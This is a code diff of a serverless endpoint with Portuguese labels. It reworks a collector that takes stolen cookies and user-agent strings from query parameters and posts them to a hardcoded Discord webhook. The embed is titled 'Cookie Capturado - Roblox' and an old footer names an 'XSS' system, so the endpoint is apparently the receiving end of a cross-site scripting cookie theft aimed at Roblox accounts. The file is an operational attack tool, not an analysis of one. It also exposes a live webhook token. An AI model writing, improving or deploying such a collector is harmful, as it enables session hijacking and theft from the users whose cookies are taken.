@@ -1,22 +1,38 @@
-export default async function handler(req, res) {
-  const { cookie = "sem cookie", userAgent = "desconhecido" } = req.query;
-  const webhook = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
+export const config = {
+  runtime: "edge",
+};
 
-  await fetch(webhook, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      embeds: [{
-        title: "Novo Cookie Capturado",
-        color: 0xff0000,
-        fields: [
-          { name: "Cookie", value: "```" + cookie + "```" },
-          { name: "User-Agent", value: userAgent }
-        ],
-        footer: { text: "Sistema XSS do DK" }
-      }]
-    })
-  });
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
 
-  res.status(200).send("OK");
+export default async function handler(req) {
+  try {
+    const { searchParams } = new URL(req.url);
+    const cookie = searchParams.get("cookie") || "Não enviado";
+    const userAgent = searchParams.get("userAgent") || "Não enviado";
+
+    const payload = {
+      embeds: [
+        {
+          title: "Cookie Capturado - Roblox",
+          color: 15158332, // vermelho
+          fields: [
+            { name: "Cookie", value: `\`\`\`${cookie}\`\`\``.slice(0, 1024), inline: false },
+            { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``.slice(0, 1024), inline: false },
+            { name: "Host", value: "roblox.com", inline: true },
+            { name: "Timestamp", value: new Date().toISOString(), inline: true },
+          ],
+        },
+      ],
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+
+    return new Response("Enviado com sucesso!", { status: 200 });
+  } catch (e) {
+    return new Response("Erro no envio", { status: 500 });
+  }
 }
